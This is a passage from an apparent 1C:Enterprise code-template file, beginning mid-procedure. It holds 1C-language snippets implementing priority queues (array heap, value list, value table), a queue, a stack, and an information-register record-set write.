    ПриоритетнаяОчередь[ИндексПервогоЭлемента] = ПриоритетнаяОчередь[ИндексВторогоЭлемента];
    ПриоритетнаяОчередь[ИндексВторогоЭлемента] = ПервыйЭлемент;
КонецПроцедуры

&НаКлиенте
Процедура Опустошение()
    Для ИндексЭлемента = 1 По ПриоритетнаяОчередь.Количество() - 1 Цикл
        Сообщить(ИзвлечьМаксимум());
    КонецЦикла;
КонецПроцедуры

&НаКлиенте
Процедура ДемоИнициализация()
    ПриоритетнаяОчередь.Очистить();
    ПриоритетнаяОчередь.Добавить(0);
    ГСЧ = Новый ГенераторСлучайныхЧисел(ТекущаяУниверсальнаяДатаВМиллисекундах());
    Для НомерЭлемента = 1 По 30 Цикл
        СЧ = ГСЧ.СлучайноеЧисло(0, 100);
        Сообщить(СЧ);
        ДобавитьЭлемент(СЧ);
    КонецЦикла;
КонецПроцедуры

&НаКлиенте
Процедура Тест(Команда)
    Сообщить(""Инициализация"");
    ДемоИнициализация();
    Сообщить(""Опустошение"");
    Опустошение();
КонецПроцедуры

ПриоритетнаяОчередь = Новый Массив;"}
},
{0,
{"приоритетную очередь используя тип СписокЗначений",0,0,"","#Область ПриоритетнаяОчередь_СписокЗначений

&НаКлиенте
Функция ПриоритетнаяОчередь_Новый(РазрядностьПриоритета = 16, РазрядностьПозиции = 16)
	Очередь = Новый Структура;
	Очередь.Вставить(""Отсортировано"", Истина);
	Очередь.Вставить(""Данные"", Новый СписокЗначений);
	Очередь.Вставить(""ФорматнаяСтрокаПриоритета"", ""ЧЦ="" + РазрядностьПриоритета + ""; ЧН=; ЧВН=; ЧГ=0"");
	Очередь.Вставить(""ФорматнаяСтрокаПозиции"", ""ЧЦ="" + РазрядностьПозиции + ""; ЧН=; ЧВН=; ЧГ=0"");
	Очередь.Вставить(""Позиция"", 0);
	Возврат Очередь;
КонецФункции

&НаКлиенте
Процедура ПриоритетнаяОчередь_Добавить(Очередь, Значение, Приоритет)
	Очередь.Отсортировано = Ложь;
	Очередь.Позиция = Очередь.Позиция + 1;
	ПриоритетСтрока =  Формат(Приоритет, Очередь.ФорматнаяСтрокаПриоритета) + Формат(Очередь.Позиция, Очередь.ФорматнаяСтрокаПозиции);
	Очередь.Данные.Добавить(Значение, ПриоритетСтрока);
КонецПроцедуры

&НаКлиенте
Функция ПриоритетнаяОчередь_ПолучитьБезУдаления(Очередь)
	Данные = Очередь.Данные;
	Если Не Очередь.Отсортировано Тогда
		Очередь.Отсортировано = Истина;
		Данные.СортироватьПоПредставлению(НаправлениеСортировки.Убыв);
	КонецЕсли;
	ИндексПоследнегоЭлемента = Данные.Количество() - 1;
	Возврат Данные[ИндексПоследнегоЭлемента].Значение;
КонецФункции

&НаКлиенте
Функция ПриоритетнаяОчередь_Получить(Очередь)
	Данные = Очередь.Данные;
	Если Не Очередь.Отсортировано Тогда
		Очередь.Отсортировано = Истина;
		Данные.СортироватьПоПредставлению(НаправлениеСортировки.Убыв);
	КонецЕсли;
	ИндексПоследнегоЭлемента = Данные.Количество() - 1;
	Значение = Данные[ИндексПоследнегоЭлемента].Значение;
	Данные.Удалить(ИндексПоследнегоЭлемента);
	Возврат Значение;
КонецФункции

&НаКлиенте
Функция ПриоритетнаяОчередь_Пустой(Очередь)
	Возврат Очередь.Данные.Количество() = 0;
КонецФункции

#КонецОбласти

Если удобней передавать максимальное число, а не разрядность то фукнция ПриоритетнаяОчередь_Новый() будет выглядеть так:

&НаКлиенте
Функция ПриоритетнаяОчередь_Новый(МаксимальноеЧислоПриоритета = Неопределено, МаксимальноеЧислоПозиции = Неопределено)
	
	РазрядностьПриоритета = ?(МаксимальноеЧислоПриоритета = Неопределено, 16, СтрДлина(Формат(МаксимальноеЧислоПриоритета, ""ЧГ=0"")));
	РазрядностьПозиции = ?(МаксимальноеЧислоПозиции = Неопределено, 16, СтрДлина(Формат(МаксимальноеЧислоПозиции, ""ЧГ=0"")));
	
	Очередь = Новый Структура;
	Очередь.Вставить(""Отсортировано"", Истина);
	Очередь.Вставить(""Данные"", Новый СписокЗначений);
	Очередь.Вставить(""ФорматнаяСтрокаПриоритета"", ""ЧЦ="" + РазрядностьПриоритета + ""; ЧН=; ЧВН=; ЧГ=0"");
	Очередь.Вставить(""ФорматнаяСтрокаПозиции"", ""ЧЦ="" + РазрядностьПозиции + ""; ЧН=; ЧВН=; ЧГ=0"");
	Очередь.Вставить(""Позиция"", 0);
	
	Возврат Очередь;
	
КонецФункции"}
},
{0,
{"приоритетную очередь используя тип ТаблицаЗначений",0,0,"","#Область ПриоритетнаяОчередь_ТаблицаЗначений

Функция ПриоритетнаяОчередь_Новый()
	Очередь = Новый Структура;
	Очередь.Вставить(""Отсортировано"",	Истина);
	Очередь.Вставить(""Данные"",		Новый ТаблицаЗначений);
	Очередь.Данные.Колонки.Добавить(""Значение"");
	Очередь.Данные.Колонки.Добавить(""Приоритет"", Новый ОписаниеТипов(""Число""));
	Очередь.Данные.Колонки.Добавить(""Позиция"", Новый ОписаниеТипов(""Число""));
	Очередь.Вставить(""Позиция"", 0);
	Возврат Очередь;
КонецФункции

Процедура ПриоритетнаяОчередь_Добавить(Очередь, Значение, Приоритет)
	Очередь.Отсортировано = Ложь;
	НоваяСтрока = Очередь.Данные.Добавить();
	НоваяСтрока.Значение = Значение;
	НоваяСтрока.Приоритет = Приоритет;
	НоваяСтрока.Позиция = Очередь.Позиция + 1;
	Очередь.Позиция = НоваяСтрока.Позиция;
КонецПроцедуры

Функция ПриоритетнаяОчередь_ПолучитьБезУдаления(Очередь)
	Данные = Очередь.Данные;
	Если Не Очередь.Отсортировано Тогда
		Очередь.Отсортировано = Истина;
		Данные.Сортировать(""Приоритет, Позиция"");
	КонецЕсли;
	Возврат Данные[0].Значение;
КонецФункции

Функция ПриоритетнаяОчередь_Получить(Очередь)
	Данные = Очередь.Данные;
	Если Не Очередь.Отсортировано Тогда
		Очередь.Отсортировано = Истина;
		Данные.Сортировать(""Приоритет, Позиция"");
	КонецЕсли;
	Значение = Данные[0].Значение;
	Данные.Удалить(0);
	Возврат Значение;
КонецФункции

Функция ПриоритетнаяОчередь_Пустой(Очередь)
	Возврат Очередь.Данные.Количество() = 0;
КонецФункции

#КонецОбласти"}
},
{0,
{"Очередь",0,0,"","#Область Очередь

Функция Очередь_Новый()
	Возврат Новый Структура(""Данные, Голова, Хвост"", Новый Массив, 0, 0)
КонецФункции

Процедура Очередь_Добавить(Очередь, Значение)
	Очередь.Данные.Добавить(Значение);
	Очередь.Хвост = Очередь.Хвост + 1;
КонецПроцедуры

Функция Очередь_ПолучитьБезУдаления(Очередь)
	Возврат Очередь.Данные[Очередь.Голова];
КонецФункции

Функция Очередь_Получить(Очередь)
	Значение = Очередь.Данные[Очередь.Голова];
	Очередь.Голова = Очередь.Голова + 1;
	Возврат Значение;
КонецФункции

Функция Очередь_Пустой(Очередь)
	Возврат Очередь.Голова = Очередь.Хвост;
КонецФункции

#КонецОбласти"}
},
{0,
{"Стек",0,0,"","#Область Стек

Функция Стек_Новый()
	Возврат Новый Массив;
КонецФункции

// Push
Процедура Стек_Положить(Стек, Значение)
	Стек.Добавить(Значение);
КонецПроцедуры

// Top
Функция Стек_ВзятьБезУдаления(Стек)
	Возврат Стек[Стек.ВГраница()];
КонецФункции

// Pop
Функция Стек_Взять(Стек)
	ИндексПоследнегоЭлемента = Стек.ВГраница();
	Значение = Стек[ИндексПоследнегоЭлемента];
	Стек.Удалить(ИндексПоследнегоЭлемента);
	Возврат Значение;
КонецФункции

// isEmpty
Функция Стек_Пустой(Стек)
	Возврат Стек.Количество() = 0;
КонецФункции

#КонецОбласти"}
}
},
{0,
{"Регистр СоздатьНаборЗаписей",0,0,"","НаборЗаписей = РегистрыСведений.ЗначенияСвойствОбъектов.СоздатьНаборЗаписей();

НаборЗаписей.Отбор.Объект.Установить(ПолеВводаНоменклатура); 

Для Каждого СтрокаТаблицы Из ТаблицаСвойств Цикл 
	
	НоваяЗапись = НаборЗаписей.Добавить(); 
	
	НоваяЗапись.Объект = ПолеВводаНоменклатура; 
	НоваяЗапись.Свойство = СтрокаТаблицы.Свойство; 
	НоваяЗапись.Значение = СтрокаТаблицы.ЗначениеСвойства; 
КонецЦикла; 

НаборЗаписей.Записать(); "}
}
}
}